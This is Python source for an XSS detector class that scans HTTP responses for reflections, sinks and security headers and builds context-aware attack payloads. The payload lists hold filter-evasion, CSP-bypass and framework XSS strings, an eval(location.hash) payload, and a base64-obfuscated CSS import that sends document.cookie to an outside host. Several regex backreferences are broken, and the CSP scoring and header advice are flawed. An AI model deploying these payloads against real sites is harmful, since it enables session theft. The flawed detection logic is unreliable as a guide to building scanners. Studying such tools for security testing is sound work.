"""
Advanced XSS Detector Module

This module extends the basic XSS payload generator with more sophisticated detection
techniques, including advanced payloads, context-aware generation, and modern framework exploits.
"""

import logging
import re
import random
import html
import json
import base64
import hashlib
from typing import Dict, List, Optional, Set, Tuple, Union
from datetime import datetime
from urllib.parse import quote, unquote, parse_qs, urlparse

class AdvancedXSSDetector:
    """
    Advanced XSS vulnerability detector with enhanced payload generation and detection capabilities.
    """
    
    def __init__(self, config: Dict = None):
        """
        Initialize the Advanced XSS Detector.
        
        Args:
            config (dict): Configuration settings for the detector.
        """
        self.logger = logging.getLogger('cachexssdetector.advanced_xss_detector')
        self.config = config or {}
        
        # Detection configuration
        self.max_detection_depth = self.config.get('max_detection_depth', 3)
        self.enable_machine_learning = self.config.get('enable_machine_learning', True)
        self.detection_timeout = self.config.get('detection_timeout', 60)
        self.analyze_dom = self.config.get('analyze_dom', True)
        
        # Initialize detection patterns
        self._init_detection_patterns()
        
        # Initialize payload templates
        self._init_advanced_templates()
        
        self.logger.info("Advanced XSS Detector initialized")
    
    def _init_detection_patterns(self):
        """Initialize detection patterns for vulnerability identification."""
        # Reflection patterns to identify where input is reflected
        self.reflection_patterns = {
            'html_body': re.compile(r'<body[^>]*>.*?</body>', re.DOTALL),
            'html_attribute': re.compile(r'<[^>]+\s+[^>]+?=(["\'])(.*?)\\1', re.DOTALL),
            'script_content': re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL),
            'javascript_string': re.compile(r'["\']([^"\']*?)["\']', re.DOTALL),
            'css_content': re.compile(r'<style[^>]*>(.*?)</style>', re.DOTALL),
            'url_param': re.compile(r'(?:\?|&)([^=]+)=([^&]+)'),
            'json_data': re.compile(r'({[\s\S]*?}|\[[\s\S]*?\])')
        }
        
        # Sink patterns to identify dangerous execution contexts
        self.sink_patterns = {
            'eval': re.compile(r'eval\s*\('),
            'document_write': re.compile(r'document\.write\s*\('),
            'inner_html': re.compile(r'\.innerHTML\s*='),
            'src_attribute': re.compile(r'src\s*=\s*(["\'])(.*?)\\1'),
            'href_attribute': re.compile(r'href\s*=\s*(["\'])(.*?)\\1'),
            'event_handler': re.compile(r'on[a-z]+\s*=\s*(["\'])(.*?)\\1'),
            'dynamic_function': re.compile(r'Function\s*\('),
            'setTimeout': re.compile(r'setTimeout\s*\('),
            'setInterval': re.compile(r'setInterval\s*\(')
        }
        
        # Sanitization patterns to identify if inputs are sanitized
        self.sanitization_patterns = {
            'html_encoding': re.compile(r'&[a-z]+;'),
            'script_removal': re.compile(r'<script>.*?</script>'),
            'tag_removal': re.compile(r'<[^>]+>'),
            'quote_escaping': re.compile(r'\\[\'"]')
        }
        
        # Defense patterns to identify security mechanisms
        self.defense_patterns = {
            'csp_header': re.compile(r'Content-Security-Policy', re.IGNORECASE),
            'xss_protection_header': re.compile(r'X-XSS-Protection', re.IGNORECASE),
            'nosniff_header': re.compile(r'X-Content-Type-Options', re.IGNORECASE)
        }
    
    def _init_advanced_templates(self):
        """Initialize advanced payload templates for different contexts."""
        # DOM-based XSS payloads targeting specific browser APIs
        self.dom_based_payloads = [
            {
                'name': 'location_hash',
                'payload': '<script>eval(location.hash.slice(1))</script>',
                'vector': 'fragment'
            },
            {
                'name': 'document_domain',
                'payload': '<script>alert(document.domain)</script>',
                'vector': 'html'
            },
            {
                'name': 'document_cookie',
                'payload': '<script>alert(document.cookie)</script>',
                'vector': 'html'
            },
            {
                'name': 'local_storage',
                'payload': '<script>alert(localStorage.getItem("sensitive"))</script>',
                'vector': 'html'
            },
            {
                'name': 'window_name',
                'payload': '<script>alert(name)</script>',
                'vector': 'html'
            }
        ]
        
        # Filter evasion techniques to bypass WAFs and filters
        self.filter_evasion_payloads = [
            {
                'name': 'case_variation',
                'payload': '<ImG sRc=x OnErRoR=alert("XSS")>',
                'vector': 'html'
            },
            {
                'name': 'null_byte',
                'payload': '<script>alert("XSS")%00</script>',
                'vector': 'html'
            },
            {
                'name': 'entity_encoding',
                'payload': '<script>&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;</script>',
                'vector': 'html'
            },
            {
                'name': 'utf8_encoding',
                'payload': '<script>ＡＬerＴ("XSS")</script>',
                'vector': 'html'
            },
            {
                'name': 'double_encoding',
                'payload': '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E',
                'vector': 'url'
            }
        ]
        
        # CSP bypass payloads targeting Content Security Policy weaknesses
        self.csp_bypass_payloads = [
            {
                'name': 'unsafe_inline',
                'payload': '<script nonce="random">alert("XSS")</script>',
                'vector': 'html'
            },
            {
                'name': 'jsonp_bypass',
                'payload': '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert"></script>',
                'vector': 'html'
            },
            {
                'name': 'angular_bypass',
                'payload': '<div ng-app ng-csp><div ng-click=$event.view.alert("XSS")>Click me</div></div>',
                'vector': 'html'
            },
            {
                'name': 'object_src_bypass',
                'payload': '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+"></object>',
                'vector': 'html'
            },
            {
                'name': 'style_src_bypass',
                'payload': '<style>@import url("data:text/css;base64,QGltcG9ydCB1cmwoJ2h0dHBzOi8vYXBpLmpzb25iaW4uaW8vYm9vay9sb2c/anNvbj0nICsgZG9jdW1lbnQuY29va2llKTs=");</style>',
                'vector': 'html'
            }
        ]
        
        # Modern framework-specific payloads
        self.framework_specific_payloads = [
            {
                'name': 'react_jsx',
                'payload': '{/* */}<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(\'XSS\')>"}}></div>',
                'vector': 'react'
            },
            {
                'name': 'vue_template',
                'payload': '<div v-html="\'<img src=x onerror=alert(`XSS`)>\'"></div>',
                'vector': 'vue'
            },
            {
                'name': 'angular_template',
                'payload': '<div [innerHTML]="\'<img src=x onerror=alert(`XSS`)>\'"></div>',
                'vector': 'angular'
            },
            {
                'name': 'svelte_html',
                'payload': '{@html "<img src=x onerror=alert(\'XSS\')>"}',
                'vector': 'svelte'
            },
            {
                'name': 'ember_triple_stache',
                'payload': '{{{<img src=x onerror=alert(\'XSS\')>}}}',
                'vector': 'ember'
            }
        ]
        
        # Advanced context-specific payloads
        self.context_specific_payloads = {
            'html_attribute': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onerror=\'alert("XSS")\' \'',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onload="alert(\'XSS\')" "'
            ],
            'script_context': [
                '";alert(\'XSS\');//',
                '\';alert(\'XSS\');//',
                '\\";alert(\'XSS\');//',
                '\\";alert(String.fromCharCode(88,83,83));//'
            ],
            'url_context': [
                'javascript:alert(\'XSS\')',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
                'vbscript:alert(\'XSS\')'
            ],
            'css_context': [
                'expression(alert(\'XSS\'))',
                'behavior: url(javascript:alert(\'XSS\'))',
                '-moz-binding: url("data:text/xml;charset=utf-8,%3Cxul%3E%3Cscript%3Ealert(\'XSS\')%3C/script%3E%3C/xul%3E")'
            ],
            'json_context': [
                '{"key":"<script>alert(\'XSS\')</script>"}',
                '{"key":"</script><script>alert(\'XSS\')</script>"}',
                '{"key":"\\u003cscript\\u003ealert(\'XSS\')\\u003c/script\\u003e"}'
            ]
        }
    
    def analyze_response(self, url: str, response_data: Dict) -> Dict:
        """
        Analyze HTTP response to detect potential XSS vulnerabilities.
        
        Args:
            url (str): The URL that was tested.
            response_data (dict): HTTP response data including headers, body, etc.
            
        Returns:
            dict: Analysis results with vulnerability details.
        """
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'reflection_points': [],
            'sinks_identified': [],
            'defense_mechanisms': [],
            'risk_level': 'low',
            'recommendation': ''
        }
        
        try:
            # Extract response components
            body = response_data.get('body', '')
            headers = response_data.get('headers', {})
            status_code = response_data.get('status_code', 0)
            
            # 1. Check for defense mechanisms
            self._analyze_defense_mechanisms(headers, results)
            
            # 2. Identify reflection points
            reflection_points = self._identify_reflection_points(body, url)
            results['reflection_points'] = reflection_points
            
            # 3. Identify potentially vulnerable sinks
            sinks = self._identify_sinks(body)
            results['sinks_identified'] = sinks
            
            # 4. Identify sanitization patterns
            sanitization = self._identify_sanitization(body)
            results['sanitization_detected'] = sanitization
            
            # 5. Analyze DOM if enabled
            if self.analyze_dom:
                dom_vulnerabilities = self._analyze_dom_vulnerabilities(body)
                results['dom_analysis'] = dom_vulnerabilities
            
            # 6. Determine vulnerability presence
            vulnerabilities = self._determine_vulnerabilities(
                reflection_points, 
                sinks,
                sanitization,
                results.get('dom_analysis', {})
            )
            results['vulnerabilities'] = vulnerabilities
            
            # 7. Calculate risk level
            results['risk_level'] = self._calculate_risk_level(results)
            
            # 8. Generate recommendations
            results['recommendation'] = self._generate_recommendations(results)
            
        except Exception as e:
            self.logger.error(f"Error analyzing response for URL {url}: {str(e)}")
            results['error'] = str(e)
        
        return results
    
    def generate_context_aware_payloads(
        self, 
        context: str,
        reflection_points: List[Dict] = None,
        max_payloads: int = 10
    ) -> List[Dict]:
        """
        Generate context-aware XSS payloads tailored to specific injection points.
        
        Args:
            context (str): The context where the payload will be injected.
            reflection_points (list, optional): Detected reflection points.
            max_payloads (int): Maximum number of payloads to generate.
            
        Returns:
            list: Generated context-aware payloads.
        """
        payloads = []
        
        try:
            # Select appropriate payload templates based on context
            if context in self.context_specific_payloads:
                templates = self.context_specific_payloads[context]
                
                for template in templates[:max_payloads]:
                    payload = {
                        'content': template,
                        'type': 'context_specific',
                        'context': context,
                        'encoding': 'none'
                    }
                    payloads.append(payload)
            
            # Add advanced evasion techniques if appropriate
            if context == 'html_body' or context == 'html_attribute':
                # Add filter evasion payloads
                for evasion in self.filter_evasion_payloads[:max_payloads // 2]:
                    payload = {
                        'content': evasion['payload'],
                        'type': 'filter_evasion',
                        'context': context,
                        'technique': evasion['name'],
                        'encoding': 'special'
                    }
                    payloads.append(payload)
            
            # Add CSP bypass payloads if CSP is detected
            if reflection_points and any('csp_detected' in point for point in reflection_points):
                for bypass in self.csp_bypass_payloads[:max_payloads // 2]:
                    payload = {
                        'content': bypass['payload'],
                        'type': 'csp_bypass',
                        'context': context,
                        'technique': bypass['name'],
                        'encoding': 'none'
                    }
                    payloads.append(payload)
            
            # Add framework-specific payloads if framework is detected
            if reflection_points and any('framework' in point for point in reflection_points):
                for framework_payload in self.framework_specific_payloads:
                    framework = framework_payload['vector']
                    if any(point.get('framework') == framework for point in reflection_points):
                        payload = {
                            'content': framework_payload['payload'],
                            'type': 'framework_specific',
                            'context': context,
                            'framework': framework,
                            'technique': framework_payload['name'],
                            'encoding': 'none'
                        }
                        payloads.append(payload)
            
            # Limit to max_payloads
            payloads = payloads[:max_payloads]
            
        except Exception as e:
            self.logger.error(f"Error generating context-aware payloads: {str(e)}")
        
        return payloads
    
    def _identify_reflection_points(self, body: str, url: str) -> List[Dict]:
        """
        Identify points in the response where input might be reflected.
        
        Args:
            body (str): Response body content.
            url (str): URL that was requested.
            
        Returns:
            list: Identified reflection points.
        """
        reflection_points = []
        
        try:
            # Parse URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # Check for parameter reflection in body
            for param, values in query_params.items():
                for value in values:
                    if value and value in body:
                        # Find context of reflection
                        for context, pattern in self.reflection_patterns.items():
                            for match in pattern.finditer(body):
                                match_text = match.group(0)
                                if value in match_text:
                                    reflection_points.append({
                                        'parameter': param,
                                        'value': value,
                                        'context': context,
                                        'surrounding': match_text[:50] + '...' if len(match_text) > 50 else match_text,
                                        'reflection_type': 'direct'
                                    })
            
            # Check for framework hints
            framework_patterns = {
                'react': re.compile(r'react|jsx|reactdom', re.IGNORECASE),
                'angular': re.compile(r'angular|ng-|ng\s', re.IGNORECASE),
                'vue': re.compile(r'vue|v-|vuejs', re.IGNORECASE),
                'svelte': re.compile(r'svelte', re.IGNORECASE),
                'ember': re.compile(r'ember', re.IGNORECASE)
            }
            
            for framework, pattern in framework_patterns.items():
                if pattern.search(body):
                    reflection_points.append({
                        'framework': framework,
                        'context': 'framework_detection',
                        'reflection_type': 'framework'
                    })
            
        except Exception as e:
            self.logger.error(f"Error identifying reflection points: {str(e)}")
        
        return reflection_points
    
    def _identify_sinks(self, body: str) -> List[Dict]:
        """
        Identify potentially vulnerable sinks in the response.
        
        Args:
            body (str): Response body content.
            
        Returns:
            list: Identified sinks.
        """
        sinks = []
        
        try:
            for sink_name, pattern in self.sink_patterns.items():
                for match in pattern.finditer(body):
                    match_text = match.group(0)
                    sinks.append({
                        'sink_name': sink_name,
                        'context': self._determine_context(match_text, body),
                        'surrounding': body[max(0, match.start() - 25):min(len(body), match.end() + 25)]
                    })
            
        except Exception as e:
            self.logger.error(f"Error identifying sinks: {str(e)}")
        
        return sinks
    
    def _identify_sanitization(self, body: str) -> Dict:
        """
        Identify if there are sanitization mechanisms in place.
        
        Args:
            body (str): Response body content.
            
        Returns:
            dict: Sanitization information.
        """
        sanitization = {
            'detected': False,
            'mechanisms': []
        }
        
        try:
            for mechanism, pattern in self.sanitization_patterns.items():
                if pattern.search(body):
                    sanitization['detected'] = True
                    sanitization['mechanisms'].append(mechanism)
            
        except Exception as e:
            self.logger.error(f"Error identifying sanitization: {str(e)}")
        
        return sanitization
    
    def _analyze_defense_mechanisms(self, headers: Dict, results: Dict) -> None:
        """
        Analyze security headers and defense mechanisms.
        
        Args:
            headers (dict): Response headers.
            results (dict): Results dictionary to update.
        """
        try:
            defenses = []
            
            # Check for security headers
            if 'Content-Security-Policy' in headers:
                csp = headers['Content-Security-Policy']
                defenses.append({
                    'type': 'CSP',
                    'value': csp,
                    'effectiveness': self._evaluate_csp_effectiveness(csp)
                })
                results['csp_detected'] = True
            
            if 'X-XSS-Protection' in headers:
                xss_protection = headers['X-XSS-Protection']
                defenses.append({
                    'type': 'X-XSS-Protection',
                    'value': xss_protection,
                    'effectiveness': 'medium' if xss_protection == '1; mode=block' else 'low'
                })
            
            if 'X-Content-Type-Options' in headers:
                nosniff = headers['X-Content-Type-Options']
                defenses.append({
                    'type': 'X-Content-Type-Options',
                    'value': nosniff,
                    'effectiveness': 'medium' if nosniff == 'nosniff' else 'low'
                })
            
            results['defense_mechanisms'] = defenses
            
        except Exception as e:
            self.logger.error(f"Error analyzing defense mechanisms: {str(e)}")
    
    def _analyze_dom_vulnerabilities(self, body: str) -> Dict:
        """
        Analyze DOM for potential vulnerabilities.
        
        Args:
            body (str): Response body content.
            
        Returns:
            dict: DOM vulnerability analysis.
        """
        dom_analysis = {
            'vulnerable_patterns': [],
            'sinks_identified': [],
            'sources_identified': [],
            'risk_level': 'low'
        }
        
        try:
            # Check for vulnerable DOM patterns
            dom_vulnerable_patterns = {
                'location_use': re.compile(r'location\s*\.\s*(hash|href|search|pathname)', re.IGNORECASE),
                'document_domain': re.compile(r'document\s*\.\s*domain', re.IGNORECASE),
                'document_write': re.compile(r'document\s*\.\s*write', re.IGNORECASE),
                'eval_usage': re.compile(r'eval\s*\(', re.IGNORECASE),
                'innerHTML_usage': re.compile(r'innerHTML\s*=', re.IGNORECASE),
                'outerHTML_usage': re.compile(r'outerHTML\s*=', re.IGNORECASE),
                'src_assign': re.compile(r'\.src\s*=', re.IGNORECASE),
                'href_assign': re.compile(r'\.href\s*=', re.IGNORECASE),
                'postMessage_usage': re.compile(r'postMessage', re.IGNORECASE)
            }
            
            for pattern_name, pattern in dom_vulnerable_patterns.items():
                for match in pattern.finditer(body):
                    dom_analysis['vulnerable_patterns'].append({
                        'pattern': pattern_name,
                        'code': body[max(0, match.start() - 25):min(len(body), match.end() + 25)]
                    })
                    
            # Check for DOM sources (user input)
            dom_sources = {
                'url_based': re.compile(r'location|URL|document\.URL|document\.documentURI', re.IGNORECASE),
                'storage_based': re.compile(r'localStorage|sessionStorage', re.IGNORECASE),
                'user_input': re.compile(r'\.value|getElementById|querySelector', re.IGNORECASE),
                'referrer': re.compile(r'document\.referrer', re.IGNORECASE),
                'cookies': re.compile(r'document\.cookie', re.IGNORECASE),
                'postMessage': re.compile(r'addEventListener\s*\(\s*[\'"]message[\'"]', re.IGNORECASE)
            }
            
            for source_name, pattern in dom_sources.items():
                for match in pattern.finditer(body):
                    dom_analysis['sources_identified'].append({
                        'source': source_name,
                        'code': body[max(0, match.start() - 25):min(len(body), match.end() + 25)]
                    })
            
            # Determine DOM risk level
            if len(dom_analysis['vulnerable_patterns']) > 3:
                dom_analysis['risk_level'] = 'high'
            elif len(dom_analysis['vulnerable_patterns']) > 0:
                dom_analysis['risk_level'] = 'medium'
            
        except Exception as e:
            self.logger.error(f"Error analyzing DOM vulnerabilities: {str(e)}")
        
        return dom_analysis
    
    def _determine_vulnerabilities(
        self, 
        reflection_points: List[Dict],
        sinks: List[Dict],
        sanitization: Dict,
        dom_analysis: Dict
    ) -> List[Dict]:
        """
        Determine if there are XSS vulnerabilities based on analysis.
        
        Args:
            reflection_points (list): Identified reflection points.
            sinks (list): Identified sinks.
            sanitization (dict): Sanitization information.
            dom_analysis (dict): DOM vulnerability analysis.
            
        Returns:
            list: Identified vulnerabilities.
        """
        vulnerabilities = []
        
        try:
            # Check for reflected XSS (reflection points + sinks)
            for point in reflection_points:
                if 'parameter' in point:
                    # Check if reflection point context matches any sink
                    matching_sinks = [s for s in sinks if s.get('context') == point.get('context')]
                    
                    if matching_sinks:
                        # If there's sanitization, risk is lower
                        risk = 'high' if not sanitization['detected'] else 'medium'
                        
                        vulnerabilities.append({
                            'type': 'reflected_xss',
                            'parameter': point['parameter'],
                            'context': point['context'],
                            'evidence': point.get('surrounding', ''),
                            'risk_level': risk,
                            'description': f"Reflected XSS vulnerability detected in parameter '{point['parameter']}' in {point['context']} context"
                        })
            
            # Check for DOM-based XSS from DOM analysis
            if dom_analysis.get('risk_level') in ['medium', 'high']:
                vulnerable_patterns = dom_analysis.get('vulnerable_patterns', [])
                sources = dom_analysis.get('sources_identified', [])
                
                if vulnerable_patterns and sources:
                    for pattern in vulnerable_patterns:
                        vulnerabilities.append({
                            'type': 'dom_based_xss',
                            'sink': pattern['pattern'],
                            'evidence': pattern['code'],
                            'risk_level': dom_analysis['risk_level'],
                            'description': f"DOM-based XSS vulnerability detected in {pattern['pattern']}"
                        })
            
        except Exception as e:
            self.logger.error(f"Error determining vulnerabilities: {str(e)}")
        
        return vulnerabilities
    
    def _calculate_risk_level(self, results: Dict) -> str:
        """
        Calculate overall risk level based on findings.
        
        Args:
            results (dict): Analysis results.
            
        Returns:
            str: Risk level (low, medium, high).
        """
        risk_level = 'low'
        
        try:
            vulnerabilities = results.get('vulnerabilities', [])
            defense_mechanisms = results.get('defense_mechanisms', [])
            
            # If there are high-risk vulnerabilities, overall risk is high
            if any(v.get('risk_level') == 'high' for v in vulnerabilities):
                risk_level = 'high'
            # If there are medium-risk vulnerabilities, overall risk is medium
            elif any(v.get('risk_level') == 'medium' for v in vulnerabilities):
                risk_level = 'medium'
            
            # If strong defenses are in place, reduce risk level
            if defense_mechanisms:
                effective_defenses = sum(1 for d in defense_mechanisms if d.get('effectiveness') in ['medium', 'high'])
                
                if effective_defenses >= 2 and risk_level == 'high':
                    risk_level = 'medium'
                elif effective_defenses >= 2 and risk_level == 'medium':
                    risk_level = 'low'
            
        except Exception as e:
            self.logger.error(f"Error calculating risk level: {str(e)}")
        
        return risk_level
    
    def _generate_recommendations(self, results: Dict) -> str:
        """
        Generate recommendations based on findings.
        
        Args:
            results (dict): Analysis results.
            
        Returns:
            str: Recommendations.
        """
        recommendations = []
        
        try:
            vulnerabilities = results.get('vulnerabilities', [])
            defense_mechanisms = results.get('defense_mechanisms', [])
            
            # Get unique vulnerability types
            vulnerability_types = set(v.get('type') for v in vulnerabilities)
            
            # Recommendations for reflected XSS
            if 'reflected_xss' in vulnerability_types:
                recommendations.append(
                    "Implement proper input validation and output encoding for user inputs. "
                    "Use context-specific encoding (HTML, JavaScript, CSS, URL) based on where data is inserted."
                )
                
                # If specific parameters are identified
                reflected_params = set(v.get('parameter') for v in vulnerabilities if v.get('type') == 'reflected_xss' and 'parameter' in v)
                if reflected_params:
                    param_list = ', '.join(f"'{p}'" for p in reflected_params)
                    recommendations.append(
                        f"Pay special attention to sanitizing the following parameters: {param_list}"
                    )
            
            # Recommendations for DOM-based XSS
            if 'dom_based_xss' in vulnerability_types:
                recommendations.append(
                    "For DOM-based vulnerabilities, avoid using dangerous JavaScript functions like innerHTML, "
                    "document.write, and eval with user-controllable data. Use safer alternatives like textContent "
                    "and implement a strong Content Security Policy (CSP) that restricts inline scripts."
                )
            
            # Check for missing security headers
            csp_present = any(d.get('type') == 'CSP' for d in defense_mechanisms)
            xss_protection_present = any(d.get('type') == 'X-XSS-Protection' for d in defense_mechanisms)
            nosniff_present = any(d.get('type') == 'X-Content-Type-Options' for d in defense_mechanisms)
            
            if not csp_present:
                recommendations.append(
                    "Implement a Content Security Policy (CSP) to restrict the sources of executable content. "
                    "A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts."
                )
            
            if not xss_protection_present:
                recommendations.append(
                    "Add the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in "
                    "XSS protection mechanisms."
                )
            
            if not nosniff_present:
                recommendations.append(
                    "Include the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from "
                    "interpreting files as a different MIME type than declared."
                )
            
            # General recommendation
            if vulnerabilities:
                recommendations.append(
                    "Consider using a well-tested security library for input validation and output encoding, "
                    "such as DOMPurify for client-side sanitization or an equivalent server-side library."
                )
            
        except Exception as e:
            self.logger.error(f"Error generating recommendations: {str(e)}")
            recommendations.append("An error occurred while generating recommendations.")
        
        return "\n\n".join(recommendations)
    
    def _determine_context(self, match_text: str, body: str) -> str:
        """
        Determine the context of a code snippet in the HTML body.
        
        Args:
            match_text (str): The matching text.
            body (str): The full HTML body.
            
        Returns:
            str: Context identifier.
        """
        try:
            # Check for script tag context
            script_matches = re.finditer(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)
            for script_match in script_matches:
                script_content = script_match.group(1)
                if match_text in script_content:
                    return 'script_context'
            
            # Check for HTML attribute context
            attr_matches = re.finditer(r'<[^>]+\s+[^>]+?=(["\'])(.*?)\\1', body, re.DOTALL)
            for attr_match in attr_matches:
                attr_content = attr_match.group(2)
                if match_text in attr_content:
                    return 'html_attribute'
            
            # Check for CSS context
            css_matches = re.finditer(r'<style[^>]*>(.*?)</style>', body, re.DOTALL)
            for css_match in css_matches:
                css_content = css_match.group(1)
                if match_text in css_content:
                    return 'css_context'
            
            # Check for URL context
            url_matches = re.finditer(r'(href|src|action)\s*=\s*(["\'])(.*?)\\2', body, re.DOTALL)
            for url_match in url_matches:
                url_content = url_match.group(3)
                if match_text in url_content:
                    return 'url_context'
            
            # Default to HTML body context
            return 'html_body'
            
        except Exception as e:
            self.logger.error(f"Error determining context: {str(e)}")
            return 'unknown'
    
    def _evaluate_csp_effectiveness(self, csp: str) -> str:
        """
        Evaluate the effectiveness of a Content Security Policy.
        
        Args:
            csp (str): The CSP header value.
            
        Returns:
            str: Effectiveness rating (low, medium, high).
        """
        try:
            effectiveness = 'medium'  # Default
            
            # Check for unsafe CSP directives
            unsafe_patterns = [
                'unsafe-inline',
                'unsafe-eval',
                'unsafe-hashes',
                'data:',
                '*',
                'self'
            ]
            
            unsafe_count = sum(1 for pattern in unsafe_patterns if pattern in csp.lower())
            
            if unsafe_count == 0:
                effectiveness = 'high'
            elif unsafe_count > 2:
                effectiveness = 'low'
            
            # Check if script-src is defined
            if 'script-src' not in csp:
                effectiveness = 'low'
            
            return effectiveness
            
        except Exception as e:
            self.logger.error(f"Error evaluating CSP effectiveness: {str(e)}")
            return 'unknown'
